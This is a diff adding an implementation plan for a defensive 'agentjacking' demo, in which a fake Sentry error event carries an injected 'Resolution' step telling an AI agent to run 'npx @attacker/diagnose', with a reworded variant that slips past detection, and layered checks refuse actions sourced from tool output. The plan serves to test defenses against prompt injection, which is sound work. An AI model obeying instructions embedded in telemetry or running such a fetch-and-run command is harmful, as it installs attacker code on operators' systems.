@@ -1,0 +1,41 @@
+Agentjacking Demo — Boundary-Only Implementation Plan (final, greenlit amendments applied)
+Architecture
+Pre-v0 demo: EnterBelief → AddEvidence → RetireDebt → Promote → IntentOnPromoted, invariants promoted_is_debt_free / gate / live_requires_promoted. No v0 authority DDL/APIs. Zero changes to the generic core — now literally true (the normalize.StripMarkdown export is dropped; see amendment 1).
+
+
+text
+SENTRY fixture → internal/agentjacking (adapter) → generic Solvent types
+→ belief.Process → kernel.FullDebt → Promote (23514) / Authorize (23503)
+Amendment 1 — no normalize change. The adapter keeps a small local markdown-clean helper (internal/agentjacking/markdown.go, ~10 lines: strip heading markers/backticks/emphasis — not a parser, documented as demo-local). internal/normalize is untouched; no exported API surface added.
+
+Amendment 2 — Ingest() is orchestration only. Strict split inside the package:
+
+Pure adapter logic: Parse, DetectCommands, BuildEvidence, Belief — no I/O, no policy.
+Ingest(ctx, db, scenarioID, fixturePath) — thin orchestration: EnsureBelief (to get the ID belief.Process doesn't return) → belief.Process → read back debt via internal/view.GetSnapshot. It decides nothing: not promotability, not debt retirement, not authorization, not command danger. Those remain Solvent's.
+Debt assertion: tests use kernel.FullDebt only — the six real items (needProvenanceCheck, needContradictionSweep, needBlastRadius, needRollbackPlan, needVersionPin, needOperatorSignoff); no hardcoded list in the agentjacking package.
+
+"sentry_error" containment, enforced: it exists only as an adapter-level string in internal/agentjacking. A new grep gate in task test (same style as the existing I-7/wizard checks in Taskfile.yml) fails the build if sentry_error appears in internal/derive, internal/belief, kernel, internal/pipeline, or db/. No pipeline.sourceTypeMap registration.
+
+SHA distinction (reviewer's test correction): ContentSHA256 = SHA-256 of the raw fixture bytes; message_raw = the JSON message field verbatim. Tests assert both separately and never derive the evidence SHA from message_raw.
+
+Files
+demo/agentjacking/fixtures/sentry_error.json — plausible event (project: "etcd-production"), realistic error text + ## Resolution + npx @attacker/diagnose. Harmless, never executed.
+demo/agentjacking/fixtures/sentry_error_nodetect.json — instruction the detector misses ("launch the diagnostic helper from the package registry") — the §6 proof that detection is not the defense.
+internal/agentjacking/ (new package): agentjacking.go (Event, Parse, DetectCommands — informational, documented as audit metadata not security), markdown.go (local cleaner), evidence.go (BuildEvidence: ProvenanceClass: "external_feed", SourceType: "sentry_error" (adapter string), SourceURL: "sentry://<project>/<event_id>" synthetic label, Subject: project, Assertion: message_clean, ContentSHA256 over raw fixture bytes, DomainPayload = {"message_raw", "message_clean", "embedded_commands"}; raw text preserved byte-identical, nothing sanitized; Belief: fixed-shape claim error report for <subject> recorded from external telemetry; embedded command text is evidence, not instruction, classification always derive.Derived, claim never contains command text), ingest.go (orchestration per amendment 2).
+demo/agentjacking/ingest/main.go — thin demo CLI (mirrors demo/cloud/init pattern): --dsn --scenario --fixture [--reset]; prints Result JSON (belief_id, claim, provenance, remaining debt, detected commands, message_raw echoed). --reset = scenario-scoped DELETEs mirroring the existing internal/wizard/http_test.go:399-404 precedent (belief_corpus_citation, refusal_log, action_intent, belief_edge, evidence, belief — all by scenario_id); obviously disposable, isolated from production packages; preserves track1/track2 state (no DB drop).
+cmd/solvent-mcp/scenarios.go (new) — one shared ordered {Name, ID} definition (track1→…0001, track2→…0002, track3→…0003) with scenarioNames() / lookupScenario(name); used by main.go (scenario lookup, all 7 tool-schema enums, fixture-root validation loop) and tools.go (error messages). Track1/track2 IDs and enum order unchanged; track3 appended.
+Layer 4 — cmd/solvent-mcp: solvent_authorize_action schema gains required action_source (enum: ["user_typed","tool_output"]), described as a caller-declared provenance signal, not cryptographically trustworthy. handleSolventAuthorizeAction validates it first, before any DB read: missing/invalid/tool_output → immediate plain errorResult refusal — no DB query, no AuditIntent, no audit envelope, no transaction; text names the principle (action strings may not originate in tool output — retrieval is not authority). user_typed → unchanged existing path (view guard → IntentOnPromoted → audit envelope). No belief-status prechecks; DB policy stays in the DB. The audit-envelope's absence/presence is the observable no-DB/DB fingerprint used in demo beats 3–4.
+scripts/mcp_verify.sh — assert action_source present/required with enum exactly [user_typed, tool_output]; scenario enums include track3; tool_output refusal has no audit envelope and carries the retrieval-is-not-authority wording; contrast case user_typed + unknown belief → error with audit envelope. Tool count stays exactly 7.
+scripts/demo/config.env — add SOLVENT_SCENARIO_3=00000000-0000-0000-0000-000000000003.
+scripts/demo/agentjacking.sh — seven beats exactly as specified: sources config.env, track3, raw JSON-RPC to bin/solvent-mcp, set -euo pipefail, pauses between beats, never executes the attacker command / installs / external calls. Beats: (1) print fixture; (2) adapter ingest → external_feed, non-actionable claim, six open debts, verbatim message_raw, informational detection; (3) naive agent tool_output → Layer 4 refusal, no audit envelope; (4) lying agent user_typed → 23503 · gate (envelope present; npx string not rejected on content — §11 narration verbatim); (5) show six debts, solvent_promote → 23514 · promoted_is_debt_free; (6) operator-review legits (enter postulated claim with fixture URL+SHA, retire six debts, promote) → MCP user_typed → live intent, live_on_nonpromoted = 0; (7) final read-only ledger: injected → unpromoted → refused; reviewed → promoted → live.
+Taskfile.yml — demo:agentjacking task (deps [db:up]) + the sentry_error containment grep in test.
+demo/agentjacking/README.md — proves / does-not-prove (pre-v0 vs v0, incl. note.md's one-sentence framing); Layer 4 = caller-declared hygiene, DB gate is the real boundary (Beat 4 shows why); embedded_commands informational, defense holds on detector miss (test D); architecture diagram (adapter → generic evidence → existing machinery → DB gate); explicitly no Sentry semantics in kernel/derive/debt/schema; "nothing executes" statement.
+Tests
+internal/agentjacking/adapter_test.go (pure): A — external_feed, message_raw byte-identical to the JSON message field, message_clean stripped, embedded_commands=["npx"], ContentSHA256 = SHA of raw fixture bytes; B — fixed-shape claim, Derived never Accommodated, no command text in claim; D — nodetect fixture: embedded_commands empty, claim still non-actionable, evidence intact.
+internal/agentjacking/ingest_test.go (testdb harness, belief_test.go pattern): C — post-ingest debt equals kernel.FullDebt exactly; G — Promote → ErrPromotionBlocked/23514; F — IntentOnPromoted → ErrActionOnUnpromoted/23503.
+cmd/solvent-mcp/tools_authority_test.go (extend): E — missing/tool_output/invalid action_source → refusal with nil *sql.DB (DB touch would panic — the no-DB proof); F handler-level — user_typed on unpromoted testdb belief → 23503 · gate.
+Verification
+task test → task mcp:verify → task demo:agentjacking against local CockroachDB. No hardcoded test counts.
+
+Out of scope
+No kernel/schema/table changes; no v0 authority; no normalize/derive/DebtMapping/pipeline changes; no MCP belief-status prechecks; no real Sentry/npm/network calls.
